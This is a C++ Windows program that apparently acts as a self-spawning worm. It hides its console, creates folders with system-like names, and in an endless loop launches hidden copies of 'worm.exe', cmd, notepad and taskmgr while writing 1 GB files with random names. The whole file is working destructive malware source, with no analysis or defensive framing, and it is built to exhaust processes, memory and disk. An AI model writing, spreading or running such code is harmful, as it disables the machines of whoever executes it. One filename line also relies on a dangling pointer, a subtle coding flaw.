#include <Windows.h>
#include <fstream>
#include <iostream>
#include <sstream>
#include <iomanip>
#include <cstdlib>
#include <ctime>
#include <random>
#include <thread>
using namespace std;

#define PATH "C:\\WindowsLogs"
#define PATH2 "C:\\WindowsData"

string getRandomHexName(int length) {
    random_device rd;
   	mt19937 gen(rd());
    uniform_int_distribution<> dis(0, 15);

    stringstream ss;
    ss << hex;
    for (int i = 0; i < length; ++i) {
        ss << dis(gen);
    }

    return ss.str();
}


int main(){
	HWND window;
	window = FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(window,false);

	srand(time(NULL));
    
    CreateDirectory(PATH, NULL);
    CreateDirectory(PATH2, NULL);

    
    
    
   for (int i = 1; true; i++) {
   		STARTUPINFO si;
        PROCESS_INFORMATION pi;

        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));
        
    	si.dwFlags = STARTF_USESHOWWINDOW; 
        si.wShowWindow = SW_HIDE; 

        const char* processNames[] = {"worm.exe","start cmd.exe", "notepad.exe","taskmgr.exe"};

		for(int i = 0; i < 4; i++){
			if (CreateProcess(
	            NULL,               // No module name (use command line)
	            (LPSTR)processNames[i], // Command line
	            NULL,               // Process handle not inheritable
	            NULL,               // Thread handle not inheritable
	            FALSE,              // Set handle inheritance to FALSE
	            0,                  // No creation flags
	            NULL,               // Use parent's environment block
	            NULL,               // Use parent's starting directory
	            &si,                // Pointer to STARTUPINFO structure
	            &pi                 // Pointer to PROCESS_INFORMATION structure
	        ))
			{
				system("color 02");
				system("tree");
			}
		}
        

        // Close process and thread handles
        //CloseHandle(pi.hProcess);
        //CloseHandle(pi.hThread);
        
        string randomHexName = getRandomHexName((rand() % 64 + 32)+i);
        const string paths[] = {"C:\\WindowsLogs\\","C:\\WindowsData\\"};
        const char* filename = (paths[rand() % 2] + randomHexName+".bin").c_str();
        const int fileSizeInBytes = 1024 * 1024 * 1024;

        ofstream file(filename, ios::binary);
        file.seekp(fileSizeInBytes);
        file.put(0);
        file.close();
    }
	
    return EXIT_SUCCESS;
}
